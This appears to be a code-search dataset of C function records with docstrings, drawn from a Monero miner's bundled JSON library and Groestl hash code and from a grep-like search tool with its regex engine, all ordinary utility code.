{"docstring": "/*** object ***/\n", "func_signal": "json_t *json_object(void)", "code": "{\n    json_object_t *object = jsonp_malloc(sizeof(json_object_t));\n    if(!object)\n        return NULL;\n    json_init(&object->json, JSON_OBJECT);\n\n    if(hashtable_init(&object->hashtable))\n    {\n        jsonp_free(object);\n        return NULL;\n    }\n\n    object->serial = 0;\n    object->visited = 0;\n\n    return &object->json;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** equality ***/\n", "func_signal": "int json_equal(json_t *json1, json_t *json2)", "code": "{\n    if(!json1 || !json2)\n        return 0;\n\n    if(json_typeof(json1) != json_typeof(json2))\n        return 0;\n\n    /* this covers true, false and null as they are singletons */\n    if(json1 == json2)\n        return 1;\n\n    if(json_is_object(json1))\n        return json_object_equal(json1, json2);\n\n    if(json_is_array(json1))\n        return json_array_equal(json1, json2);\n\n    if(json_is_string(json1))\n        return json_string_equal(json1, json2);\n\n    if(json_is_integer(json1))\n        return json_integer_equal(json1, json2);\n\n    if(json_is_real(json1))\n        return json_real_equal(json1, json2);\n\n    return 0;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** lexical analyzer ***/\n", "func_signal": "static void\nstream_init(stream_t *stream, get_func get, void *data)", "code": "{\n    stream->get = get;\n    stream->data = data;\n    stream->buffer[0] = '\\0';\n    stream->buffer_pos = 0;\n\n    stream->state = STREAM_STATE_OK;\n    stream->line = 1;\n    stream->column = 0;\n    stream->position = 0;\n}", "path": "compat\\jansson\\load.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/* finalise: process remaining data (including padding), perform\n   output transformation, and write hash result to 'output' */\n", "func_signal": "static void Final(groestlHashState* ctx,\n\t\t BitSequence* output)", "code": "{\n  int i, j = 0, hashbytelen = HASH_BIT_LEN/8;\n  uint8_t *s = (BitSequence*)ctx->chaining;\n\n  /* pad with '1'-bit and first few '0'-bits */\n  if (BILB) {\n    ctx->buffer[(int)ctx->buf_ptr-1] &= ((1<<BILB)-1)<<(8-BILB);\n    ctx->buffer[(int)ctx->buf_ptr-1] ^= 0x1<<(7-BILB);\n    BILB = 0;\n  }\n  else ctx->buffer[(int)ctx->buf_ptr++] = 0x80;\n\n  /* pad with '0'-bits */\n  if (ctx->buf_ptr > SIZE512-LENGTHFIELDLEN) {\n    /* padding requires two blocks */\n    while (ctx->buf_ptr < SIZE512) {\n      ctx->buffer[(int)ctx->buf_ptr++] = 0;\n    }\n    /* digest first padding block */\n    Transform(ctx, ctx->buffer, SIZE512);\n    ctx->buf_ptr = 0;\n  }\n  while (ctx->buf_ptr < SIZE512-LENGTHFIELDLEN) {\n    ctx->buffer[(int)ctx->buf_ptr++] = 0;\n  }\n\n  /* length padding */\n  ctx->block_counter1++;\n  if (ctx->block_counter1 == 0) ctx->block_counter2++;\n  ctx->buf_ptr = SIZE512;\n\n  while (ctx->buf_ptr > SIZE512-(int)sizeof(uint32_t)) {\n    ctx->buffer[(int)--ctx->buf_ptr] = (uint8_t)ctx->block_counter1;\n    ctx->block_counter1 >>= 8;\n  }\n  while (ctx->buf_ptr > SIZE512-LENGTHFIELDLEN) {\n    ctx->buffer[(int)--ctx->buf_ptr] = (uint8_t)ctx->block_counter2;\n    ctx->block_counter2 >>= 8;\n  }\n  /* digest final padding block */\n  Transform(ctx, ctx->buffer, SIZE512);\n  /* perform output transformation */\n  OutputTransformation(ctx);\n\n  /* store hash result in output */\n  for (i = SIZE512-hashbytelen; i < SIZE512; i++,j++) {\n    output[j] = s[i];\n  }\n\n  /* zeroise relevant variables and deallocate memory */\n  for (i = 0; i < COLS512; i++) {\n    ctx->chaining[i] = 0;\n  }\n  for (i = 0; i < SIZE512; i++) {\n    ctx->buffer[i] = 0;\n  }\n}", "path": "crypto\\c_groestl.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/* assumes that str points to 'u' plus at least 4 valid hex digits */\n", "func_signal": "static int32_t decode_unicode_escape(const char *str)", "code": "{\n    int i;\n    int32_t value = 0;\n\n    assert(str[0] == 'u');\n\n    for(i = 1; i <= 4; i++) {\n        char c = str[i];\n        value <<= 4;\n        if(l_isdigit(c))\n            value += c - '0';\n        else if(l_islower(c))\n            value += c - 'a' + 10;\n        else if(l_isupper(c))\n            value += c - 'A' + 10;\n        else\n            assert(0);\n    }\n\n    return value;\n}", "path": "compat\\jansson\\load.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/* hash bit sequence */\n", "func_signal": "void groestl(const BitSequence* data,\n\t\tDataLength databitlen,\n\t\tBitSequence* hashval)", "code": "{\n\n  groestlHashState context;\n\n  /* initialise */\n    Init(&context);\n\n\n  /* process message */\n  Update(&context, data, databitlen);\n\n  /* finalise */\n  Final(&context, hashval);\n}", "path": "crypto\\c_groestl.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** string ***/\n", "func_signal": "json_t *json_string_nocheck(const char *value)", "code": "{\n    json_string_t *string;\n\n    if(!value)\n        return NULL;\n\n    string = jsonp_malloc(sizeof(json_string_t));\n    if(!string)\n        return NULL;\n    json_init(&string->json, JSON_STRING);\n\n    string->value = jsonp_strdup(value);\n    if(!string->value) {\n        jsonp_free(string);\n        return NULL;\n    }\n\n    return &string->json;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** array ***/\n", "func_signal": "json_t *json_array(void)", "code": "{\n    json_array_t *array = jsonp_malloc(sizeof(json_array_t));\n    if(!array)\n        return NULL;\n    json_init(&array->json, JSON_ARRAY);\n\n    array->entries = 0;\n    array->size = 8;\n\n    array->table = jsonp_malloc(array->size * sizeof(json_t *));\n    if(!array->table) {\n        jsonp_free(array);\n        return NULL;\n    }\n\n    array->visited = 0;\n\n    return &array->json;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/* compute compression function (short variants) */\n", "func_signal": "static void F512(uint32_t *h, const uint32_t *m)", "code": "{\n  int i;\n  uint32_t Ptmp[2*COLS512];\n  uint32_t Qtmp[2*COLS512];\n  uint32_t y[2*COLS512];\n  uint32_t z[2*COLS512];\n\n  for (i = 0; i < 2*COLS512; i++) {\n    z[i] = m[i];\n    Ptmp[i] = h[i]^m[i];\n  }\n\n  /* compute Q(m) */\n  RND512Q((uint8_t*)z, y, 0x00000000);\n  RND512Q((uint8_t*)y, z, 0x01000000);\n  RND512Q((uint8_t*)z, y, 0x02000000);\n  RND512Q((uint8_t*)y, z, 0x03000000);\n  RND512Q((uint8_t*)z, y, 0x04000000);\n  RND512Q((uint8_t*)y, z, 0x05000000);\n  RND512Q((uint8_t*)z, y, 0x06000000);\n  RND512Q((uint8_t*)y, z, 0x07000000);\n  RND512Q((uint8_t*)z, y, 0x08000000);\n  RND512Q((uint8_t*)y, Qtmp, 0x09000000);\n\n  /* compute P(h+m) */\n  RND512P((uint8_t*)Ptmp, y, 0x00000000);\n  RND512P((uint8_t*)y, z, 0x00000001);\n  RND512P((uint8_t*)z, y, 0x00000002);\n  RND512P((uint8_t*)y, z, 0x00000003);\n  RND512P((uint8_t*)z, y, 0x00000004);\n  RND512P((uint8_t*)y, z, 0x00000005);\n  RND512P((uint8_t*)z, y, 0x00000006);\n  RND512P((uint8_t*)y, z, 0x00000007);\n  RND512P((uint8_t*)z, y, 0x00000008);\n  RND512P((uint8_t*)y, Ptmp, 0x00000009);\n\n  /* compute P(h+m) + Q(m) + h */\n  for (i = 0; i < 2*COLS512; i++) {\n    h[i] ^= Ptmp[i]^Qtmp[i];\n  }\n}", "path": "crypto\\c_groestl.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/* update state with databitlen bits of input */\n", "func_signal": "static void Update(groestlHashState* ctx,\n\t\t  const BitSequence* input,\n\t\t  DataLength databitlen)", "code": "{\n  int index = 0;\n  int msglen = (int)(databitlen/8);\n  int rem = (int)(databitlen%8);\n\n  /* if the buffer contains data that has not yet been digested, first\n     add data to buffer until full */\n  if (ctx->buf_ptr) {\n    while (ctx->buf_ptr < SIZE512 && index < msglen) {\n      ctx->buffer[(int)ctx->buf_ptr++] = input[index++];\n    }\n    if (ctx->buf_ptr < SIZE512) {\n      /* buffer still not full, return */\n      if (rem) {\n\tctx->bits_in_last_byte = rem;\n\tctx->buffer[(int)ctx->buf_ptr++] = input[index];\n      }\n      return;\n    }\n\n    /* digest buffer */\n    ctx->buf_ptr = 0;\n    Transform(ctx, ctx->buffer, SIZE512);\n  }\n\n  /* digest bulk of message */\n  Transform(ctx, input+index, msglen-index);\n  index += ((msglen-index)/SIZE512)*SIZE512;\n\n  /* store remaining data in buffer */\n  while (index < msglen) {\n    ctx->buffer[(int)ctx->buf_ptr++] = input[index++];\n  }\n\n  /* if non-integral number of bytes have been supplied, store\n     remaining bits in last byte, together with information about\n     number of bits */\n  if (rem) {\n    ctx->bits_in_last_byte = rem;\n    ctx->buffer[(int)ctx->buf_ptr++] = input[index];\n  }\n}", "path": "crypto\\c_groestl.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** deletion ***/\n", "func_signal": "void json_delete(json_t *json)", "code": "{\n    if(json_is_object(json))\n        json_delete_object(json_to_object(json));\n\n    else if(json_is_array(json))\n        json_delete_array(json_to_array(json));\n\n    else if(json_is_string(json))\n        json_delete_string(json_to_string(json));\n\n    else if(json_is_integer(json))\n        json_delete_integer(json_to_integer(json));\n\n    else if(json_is_real(json))\n        json_delete_real(json_to_real(json));\n\n    /* json_delete is not called for true, false or null */\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** integer ***/\n", "func_signal": "json_t *json_integer(json_int_t value)", "code": "{\n    json_integer_t *integer = jsonp_malloc(sizeof(json_integer_t));\n    if(!integer)\n        return NULL;\n    json_init(&integer->json, JSON_INTEGER);\n\n    integer->value = value;\n    return &integer->json;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/* digest up to msglen bytes of input (full blocks only) */\n", "func_signal": "static void Transform(groestlHashState *ctx,\n\t       const uint8_t *input,\n\t       int msglen)", "code": "{\n\n  /* digest message, one block at a time */\n  for (; msglen >= SIZE512;\n       msglen -= SIZE512, input += SIZE512) {\n    F512(ctx->chaining,(uint32_t*)input);\n\n    /* increment block counter */\n    ctx->block_counter1++;\n    if (ctx->block_counter1 == 0) ctx->block_counter2++;\n  }\n}", "path": "crypto\\c_groestl.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** simple values ***/\n", "func_signal": "json_t *json_true(void)", "code": "{\n    static json_t the_true = {JSON_TRUE, (size_t)-1};\n    return &the_true;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/* compute one round of Q (short variants) */\n", "func_signal": "static void RND512Q(uint8_t *x, uint32_t *y, uint32_t r)", "code": "{\n  uint32_t temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp;\n  uint32_t* x32 = (uint32_t*)x;\n  x32[ 0] = ~x32[ 0];\n  x32[ 1] ^= 0xffffffff^r;\n  x32[ 2] = ~x32[ 2];\n  x32[ 3] ^= 0xefffffff^r;\n  x32[ 4] = ~x32[ 4];\n  x32[ 5] ^= 0xdfffffff^r;\n  x32[ 6] = ~x32[ 6];\n  x32[ 7] ^= 0xcfffffff^r;\n  x32[ 8] = ~x32[ 8];\n  x32[ 9] ^= 0xbfffffff^r;\n  x32[10] = ~x32[10];\n  x32[11] ^= 0xafffffff^r;\n  x32[12] = ~x32[12];\n  x32[13] ^= 0x9fffffff^r;\n  x32[14] = ~x32[14];\n  x32[15] ^= 0x8fffffff^r;\n  COLUMN(x,y, 0,  2,  6, 10, 14,  1,  5,  9, 13, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n  COLUMN(x,y, 2,  4,  8, 12,  0,  3,  7, 11, 15, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n  COLUMN(x,y, 4,  6, 10, 14,  2,  5,  9, 13,  1, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n  COLUMN(x,y, 6,  8, 12,  0,  4,  7, 11, 15,  3, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n  COLUMN(x,y, 8, 10, 14,  2,  6,  9, 13,  1,  5, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n  COLUMN(x,y,10, 12,  0,  4,  8, 11, 15,  3,  7, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n  COLUMN(x,y,12, 14,  2,  6, 10, 13,  1,  5,  9, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n  COLUMN(x,y,14,  0,  4,  8, 12, 15,  3,  7, 11, temp_v1, temp_v2, temp_upper_value, temp_lower_value, temp);\n}", "path": "crypto\\c_groestl.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** error reporting ***/\n", "func_signal": "static void error_set(json_error_t *error, const lex_t *lex,\n                      const char *msg, ...)", "code": "{\n    va_list ap;\n    char msg_text[JSON_ERROR_TEXT_LENGTH];\n    char msg_with_context[JSON_ERROR_TEXT_LENGTH];\n\n    int line = -1, col = -1;\n    size_t pos = 0;\n    const char *result = msg_text;\n\n    if(!error)\n        return;\n\n    va_start(ap, msg);\n    vsnprintf(msg_text, JSON_ERROR_TEXT_LENGTH, msg, ap);\n    msg_text[JSON_ERROR_TEXT_LENGTH - 1] = '\\0';\n    va_end(ap);\n\n    if(lex)\n    {\n        const char *saved_text = strbuffer_value(&lex->saved_text);\n\n        line = lex->stream.line;\n        col = lex->stream.column;\n        pos = lex->stream.position;\n\n        if(saved_text && saved_text[0])\n        {\n            if(lex->saved_text.length <= 20) {\n                snprintf(msg_with_context, JSON_ERROR_TEXT_LENGTH,\n                         \"%s near '%s'\", msg_text, saved_text);\n                msg_with_context[JSON_ERROR_TEXT_LENGTH - 1] = '\\0';\n                result = msg_with_context;\n            }\n        }\n        else\n        {\n            if(lex->stream.state == STREAM_STATE_ERROR) {\n                /* No context for UTF-8 decoding errors */\n                result = msg_text;\n            }\n            else {\n                snprintf(msg_with_context, JSON_ERROR_TEXT_LENGTH,\n                         \"%s near end of file\", msg_text);\n                msg_with_context[JSON_ERROR_TEXT_LENGTH - 1] = '\\0';\n                result = msg_with_context;\n            }\n        }\n    }\n\n    jsonp_error_set(error, line, col, pos, \"%s\", result);\n}", "path": "compat\\jansson\\load.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** number ***/\n", "func_signal": "double json_number_value(const json_t *json)", "code": "{\n    if(json_is_integer(json))\n        return (double)json_integer_value(json);\n    else if(json_is_real(json))\n        return json_real_value(json);\n    else\n        return 0.0;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** real ***/\n", "func_signal": "json_t *json_real(double value)", "code": "{\n    json_real_t *real;\n\n    if(isnan(value) || isinf(value))\n        return NULL;\n\n    real = jsonp_malloc(sizeof(json_real_t));\n    if(!real)\n        return NULL;\n    json_init(&real->json, JSON_REAL);\n\n    real->value = value;\n    return &real->json;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/*** copying ***/\n", "func_signal": "json_t *json_copy(json_t *json)", "code": "{\n    if(!json)\n        return NULL;\n\n    if(json_is_object(json))\n        return json_object_copy(json);\n\n    if(json_is_array(json))\n        return json_array_copy(json);\n\n    if(json_is_string(json))\n        return json_string_copy(json);\n\n    if(json_is_integer(json))\n        return json_integer_copy(json);\n\n    if(json_is_real(json))\n        return json_real_copy(json);\n\n    if(json_is_true(json) || json_is_false(json) || json_is_null(json))\n        return json;\n\n    return NULL;\n}", "path": "compat\\jansson\\value.c", "repo_name": "xmrMiner/xmrMiner", "stars": 171, "license": "gpl-3.0", "language": "c", "size": 16871}
{"docstring": "/**\n * Search backward from the end of the `n` bytes pointed to by `buf`. The buffer and target char is\n * compared as unsigned char.\n */\n", "func_signal": "char *reverse_char(const char *buf, char c, size_t n)", "code": "{\n    if (n == 0) {\n        return NULL;\n    }\n\n    unsigned char *p = (unsigned char *)buf;\n    unsigned char uc = c;\n    while (--n != 0) {\n        if (buf[n] == uc) return (char *)buf + n;\n    }\n    return p[n] == uc ? (char *)p : NULL;\n}", "path": "src\\search.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* Sunday's quick search applied to a multibyte string */\n", "func_signal": "static UChar*\nbm_search_notrev(regex_t* reg, const UChar* target, const UChar* target_end,\n\t\t const UChar* text, const UChar* text_end,\n\t\t const UChar* text_range)", "code": "{\n  const UChar *s, *se, *t, *p, *end;\n  const UChar *tail;\n  ptrdiff_t skip, tlen1;\n  OnigEncoding enc = reg->enc;\n  int (*mbc_enc_len)(const OnigUChar* p) = enc->mbc_enc_len;\n\n#ifdef ONIG_DEBUG_SEARCH\n  fprintf(stderr, \"bm_search_notrev: text: %\"PRIdPTR\" (%p), text_end: %\"PRIdPTR\" (%p), text_range: %\"PRIdPTR\" (%p)\\n\",\n\t  (intptr_t )text, text, (intptr_t )text_end, text_end, (intptr_t )text_range, text_range);\n#endif\n\n  tail = target_end - 1;\n  tlen1 = tail - target;\n  end = text_range;\n  if (end + tlen1 > text_end)\n    end = text_end - tlen1;\n\n  s = text;\n\n  if (IS_NULL(reg->int_map)) {\n    while (s < end) {\n      p = se = s + tlen1;\n      t = tail;\n      while (*p == *t) {\n\tif (t == target) return (UChar* )s;\n\tp--; t--;\n      }\n      if (s + 1 >= end) break;\n      skip = reg->map[se[1]];\n      t = s;\n      do {\n        s += mbc_enc_len(s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n  else {\n    while (s < end) {\n      p = se = s + tlen1;\n      t = tail;\n      while (*p == *t) {\n\tif (t == target) return (UChar* )s;\n\tp--; t--;\n      }\n      if (s + 1 >= end) break;\n      skip = reg->int_map[se[1]];\n      t = s;\n      do {\n        s += mbc_enc_len(s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n\n  return (UChar* )NULL;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* Sunday's quick search */\n", "func_signal": "static UChar*\nbm_search(regex_t* reg, const UChar* target, const UChar* target_end,\n\t  const UChar* text, const UChar* text_end, const UChar* text_range)", "code": "{\n  const UChar *s, *t, *p, *end;\n  const UChar *tail;\n  ptrdiff_t tlen1;\n\n  tail = target_end - 1;\n  tlen1 = tail - target;\n  end = text_range + tlen1;\n  if (end > text_end)\n    end = text_end;\n\n  s = text + tlen1;\n  if (IS_NULL(reg->int_map)) {\n    while (s < end) {\n      p = s;\n      t = tail;\n      while (*p == *t) {\n\tif (t == target) return (UChar* )p;\n\tp--; t--;\n      }\n      if (s + 1 >= end) break;\n      s += reg->map[s[1]];\n    }\n  }\n  else { /* see int_map[] */\n    while (s < end) {\n      p = s;\n      t = tail;\n      while (*p == *t) {\n\tif (t == target) return (UChar* )p;\n\tp--; t--;\n      }\n      if (s + 1 >= end) break;\n      s += reg->int_map[s[1]];\n    }\n  }\n  return (UChar* )NULL;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Set the fd resource limit. This method is used because hw will open too many files while\n * searching in very large directory, so it may occur an error when open(2), opendir(3), etc... was\n * called if too many files was opened. To avoid that, we release the limit.\n */\n", "func_signal": "bool set_fd_rlimit(rlim_t limit)", "code": "{\n#ifndef _WIN32\n    struct rlimit r;\n    getrlimit(RLIMIT_NOFILE, &r);\n    if (limit < r.rlim_max) {\n        r.rlim_cur = limit;\n        return setrlimit(RLIMIT_NOFILE, &r) == 0;\n    }\n#endif\n\n    return false;\n}", "path": "src\\util.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* Boyer-Moore-Horspool search applied to a multibyte string (ignore case) */\n", "func_signal": "static UChar*\nbm_search_notrev_ic(regex_t* reg, const UChar* target, const UChar* target_end,\n\t\t    const UChar* text, const UChar* text_end,\n\t\t    const UChar* text_range)", "code": "{\n  const UChar *s, *se, *t, *end;\n  const UChar *tail;\n  ptrdiff_t skip, tlen1;\n  OnigEncoding enc = reg->enc;\n  int case_fold_flag = reg->case_fold_flag;\n\n#ifdef ONIG_DEBUG_SEARCH\n  fprintf(stderr, \"bm_search_notrev_ic: text: %d (%p), text_end: %d (%p), text_range: %d (%p)\\n\",\n\t  (int )text, text, (int )text_end, text_end, (int )text_range, text_range);\n#endif\n\n  tail = target_end - 1;\n  tlen1 = tail - target;\n  end = text_range;\n  if (end + tlen1 > text_end)\n    end = text_end - tlen1;\n\n  s = text;\n\n  if (IS_NULL(reg->int_map)) {\n    while (s < end) {\n      se = s + tlen1;\n      if (str_lower_case_match(enc, case_fold_flag, target, target_end,\n\t\t\t       s, se + 1))\n\treturn (UChar* )s;\n      skip = reg->map[*se];\n      t = s;\n      do {\n        s += enclen(reg->enc, s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n  else {\n    while (s < end) {\n      se = s + tlen1;\n      if (str_lower_case_match(enc, case_fold_flag, target, target_end,\n\t\t\t       s, se + 1))\n\treturn (UChar* )s;\n      skip = reg->int_map[*se];\n      t = s;\n      do {\n        s += enclen(reg->enc, s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n\n  return (UChar* )NULL;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Collect after lines from `last_line_end`.\n */\n", "func_signal": "const char *after_context(const char *next_line_head,\n                          const char *last_line_end,\n                          ssize_t rest_len,\n                          int line_no,\n                          match_line_list *match_lines,\n                          char eol,\n                          int *count)", "code": "{\n    const char *current = last_line_end;\n    int lim = MAX(op.context, op.after_context);\n    *count = 0;\n\n    for (int i = 0; i < lim; i++) {\n        // Break this loop if the current line reaches to the next line.\n        if (next_line_head == current || rest_len <= 0) {\n            break;\n        }\n\n        const char *after_line = memchr(current, eol, rest_len);\n        if (after_line == NULL) {\n            after_line = current + rest_len;\n        }\n\n        int line_len = after_line - current;\n\n        match_line_node *node = (match_line_node *)hw_malloc(sizeof(match_line_node));\n        node->line_no = line_no + i + 1;\n        node->context = CONTEXT_AFTER;\n        node->line = (char *)hw_calloc(line_len + 1, SIZE_OF_CHAR);\n\n        if (!op.no_omit && line_len > op.omit_threshold) {\n            strncat(node->line, current, op.omit_threshold - DOT_LENGTH);\n            APPEND_DOT(op.color, node->line);\n        } else {\n            strncat(node->line, current, line_len);\n        }\n\n        enqueue_match_line(match_lines, node);\n        (*count)++;\n\n        rest_len -= after_line - current + 1;\n        current = ++after_line;\n    }\n\n    return current;\n}", "path": "src\\search.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Search PATTERN from the line and format.\n */\n", "func_signal": "int format_line(const char *line,\n                size_t line_len,\n                const char *pattern,\n                int pattern_len,\n                enum file_type t,\n                int line_no,\n                match *first_match,\n                match_line_list *match_lines,\n                int thread_no)", "code": "{\n    // Create new match object default size. Maybe, in the most case, default size is very enough\n    // because the PATTERN is appeared in one line only less than 10 count.\n    int n = 10;\n    match *matches = (match *)hw_malloc(sizeof(match) * n);\n\n    int match_count = 1;\n    int offset = first_match->end;\n    matches[0] = *first_match;\n\n    // Search the all of PATTERN in the line.\n    while (search_by(line + offset, line_len - offset, pattern, pattern_len, t, &matches[match_count], thread_no)) {\n        matches[match_count].start += offset;\n        matches[match_count].end   += offset;\n        offset = matches[match_count].end;\n\n        match_count++;\n\n        // Two times memory will be reallocated if match size is not enough.\n        if (n <= match_count) {\n            n *= 2;\n            matches = (match *)hw_realloc(matches, sizeof(match) * n);\n        }\n    }\n\n    // Allocate memory for colorized result string.\n    int buffer_len = line_len + (op.color_match_len + OMIT_ESCAPE_LEN) * match_count;\n    if (match_count && !op.no_omit) {\n        buffer_len += OMIT_ESCAPE_LEN;\n    }\n    match_line_node *node = (match_line_node *)hw_malloc(sizeof(match_line_node));\n    node->line_no = line_no;\n    node->context = CONTEXT_NONE;\n    node->line = (char *)hw_calloc(buffer_len, SIZE_OF_CHAR);\n\n    const char *start = line;\n    int old_end = 0;\n    for (int i = 0; i < match_count; i++) {\n        /* format_match_string(node->line, start, &matches[i], old_end, i); */\n        match m = matches[i];\n\n        // Append prefix string.\n        int prefix_len = m.start - old_end;\n        format_line_middle(node->line, start, prefix_len, i == 0 ? AT_FIRST : AT_MIDDLE);\n\n        // Append matching word with color.\n        strncat_with_color(node->line, start + prefix_len, m.end - m.start, op.color_match);\n\n        start += m.end - old_end;\n        old_end = m.end;\n    }\n\n    // Append suffix string.\n    format_line_middle(node->line, start, line_len - matches[match_count - 1].end, AT_LAST);\n\n    enqueue_match_line(match_lines, node);\n    tc_free(matches);\n\n    return match_count;\n}", "path": "src\\search.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Scan the new line in the buffer from `from to `to`. Scaned new line count will be stored to the\n * `line_count` pointer.\n */\n", "func_signal": "char *scan_newline(char *from, char *to, size_t *line_count, char eol)", "code": "{\n    const char *start = from;\n    while (start <= to && (start = memchr(start, eol, to - start + 1)) != NULL) {\n        // Found the new line. The `start` variable points to a new line position, so it is\n        // increments in order to search next line.\n        start++;\n\n        // Also line count is incriments.\n        (*line_count)++;\n    }\n\n    return to + 1;\n}", "path": "src\\search.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* USE_SUNDAY_QUICK_SEARCH */\n", "func_signal": "static int\nset_bm_backward_skip(UChar* s, UChar* end, OnigEncoding enc ARG_UNUSED,\n\t\t     int** skip)", "code": "{\n  int i, len;\n\n  if (IS_NULL(*skip)) {\n    *skip = (int* )xmalloc(sizeof(int) * ONIG_CHAR_TABLE_SIZE);\n    if (IS_NULL(*skip)) return ONIGERR_MEMORY;\n  }\n\n  len = (int )(end - s);\n  for (i = 0; i < ONIG_CHAR_TABLE_SIZE; i++)\n    (*skip)[i] = len;\n\n  for (i = len - 1; i > 0; i--)\n    (*skip)[s[i]] = i;\n\n  return 0;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Check if the directory entry is ignored by the highway. The directory is ignored if it is the\n * current directory or upper directory or hidden directory (started directory name with dot `.`).\n */\n", "func_signal": "bool is_skip_entry(const struct dirent *entry)", "code": "{\n#ifdef HAVE_STRUCT_DIRENT_D_NAMLEN\n    size_t len = entry->d_namlen;\n#else\n    size_t len = strlen(entry->d_name);\n#endif\n\n    bool is_dir = ENTRY_ISDIR(entry);\n    bool cur    = len == 1 && entry->d_name[0] == '.';\n    bool up     = len == 2 && entry->d_name[0] == '.' && entry->d_name[1] == '.';\n    bool hidden = len  > 1 && entry->d_name[0] == '.' && !op.all_files;\n\n    if ((is_dir && (cur || up)) || hidden) {\n        return true;\n    }\n\n    if (op.ext_count > 0 && !is_dir) {\n        char *ext = rindex(entry->d_name, '.');\n        if (ext && ext[1] != '\\0') {\n            ext++;\n            for (int i = 0; i < op.ext_count; i++) {\n                if (strcmp(ext, op.ext[i]) == 0) {\n                    return false;\n                }\n            }\n        }\n        return true;\n    }\n\n    return false;\n}", "path": "src\\scan.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
